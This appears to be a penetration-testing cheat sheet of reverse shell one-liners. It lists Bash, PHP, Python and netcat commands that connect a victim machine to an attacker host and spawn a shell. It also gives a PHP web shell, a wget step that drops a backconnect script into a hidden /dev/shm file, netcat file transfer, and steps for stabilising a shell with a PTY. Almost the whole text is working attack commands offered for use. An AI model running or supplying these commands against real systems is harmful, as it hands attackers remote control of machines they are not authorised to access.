# Reverse Shell

## Bash

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```

## PHP

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```
<?php system($_GET['cmd']); ?>
echo system($_REQUEST['cmd']); #Add the php tags
/file.php?cmd=whoami
```

## Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### python-pty-shells

https://github.com/infodox/python-pty-shells

Edit tcp_pty_backconnect.py

```
On Victim
wget IP:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py

On Attacker
python tcp_pty_shell_handler.py -b IP:PORT

On Victim
python /dev/shm/.rev.py
```

## Netcat

```
nc -e /bin/sh 10.0.3.4 9001

Listen with

nc -lvnp 9001
```

```
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### Downloading files with netcat

Open receiving connection

```
nc -lvnp 1234 > file.zip

Send the file over

nc -w 4 <your_hackthebox_ip> 1234 < file_name.zip
```

## MSFvenom

## Improving Shells

```
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

echo os.system('/bin/bash')

/bin/sh -i
```

Once bash is running in the PTY, background the shell with Ctrl-Z

While the shell is in the background, now examine the current terminal and STTY 

```
echo $TERM
stty -a
stty raw -echo
fg
```

Set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)

```
reset
$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
```